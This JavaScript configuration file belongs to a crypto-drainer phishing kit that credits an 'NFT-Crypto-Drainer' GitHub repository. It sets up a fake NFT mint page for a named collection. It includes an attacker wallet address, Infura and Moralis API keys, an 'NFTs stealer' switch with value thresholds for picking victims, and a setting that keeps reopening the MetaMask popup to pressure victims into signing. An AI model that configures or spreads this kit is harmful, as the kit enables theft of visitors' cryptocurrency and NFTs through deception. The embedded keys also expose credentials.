// ⚠️ for infura & moralis, make you sure that you copy same number of characters
const address = "0x89af32fcD3b38Bc80CA01C6a919f948677f7814a";    // Your ETH wallet that you have to receive NFTs
const infuraId = "c53713264c884b729e341699e8c0ece9"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
const moralisApi = "Z3CREzWYyTqnajKSvdyknQpoRWEr8uUcRSsQbhlxkvmL7JSqZLeWHzYQMJGqCsk6"    // Web3 Api key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "J. Pierce & Friends",
    title: "J. Pierce & Friends", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "25.06.2022",
    socialMedia: {
        discord: "https://discord.com/invite/h5rex3zxmf",
        twitter: "https://twitter.com/JPandFriendsNFT",
    },
    medias: {
        preview: "preview.png",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#ff4845",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.1,         // Price per NFT.
    totalSupply: 10000,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 6,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "" // leave empty if you want to use the same address 
}

/* 
    | = = = | https://github.com/0x32Moon/NFT-Crypto-Drainer | = = = | 
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
